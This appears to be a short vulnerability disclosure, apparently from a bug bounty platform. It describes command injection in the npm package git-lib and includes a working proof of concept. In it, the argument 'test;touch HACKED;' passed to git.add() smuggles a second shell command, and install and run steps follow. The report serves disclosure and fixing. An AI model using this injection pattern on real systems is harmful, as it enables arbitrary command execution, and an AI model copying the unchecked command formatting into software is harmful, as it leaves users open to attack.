The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. 

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Create the following PoC file:
```js
// poc.js
var git = require("git-lib");
git.add("test;touch HACKED;").then(function(){
	/** successfully added **/
}).catch(function(err){
	/** unsuccessful **/
});
```
1. Check there aren't files called `HACKED`
1. Execute the following commands in another terminal:
```bash
npm i git-lib # Install affected module
git init # Avoid problems with *git*
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created
## References:
 - [GitHub Issue](https://github.com/joeyism/node-git-lib/issues/2)
 - [GitHub Permalink #1](https://github.com/joeyism/node-git-lib/blob/master/git.js#L13)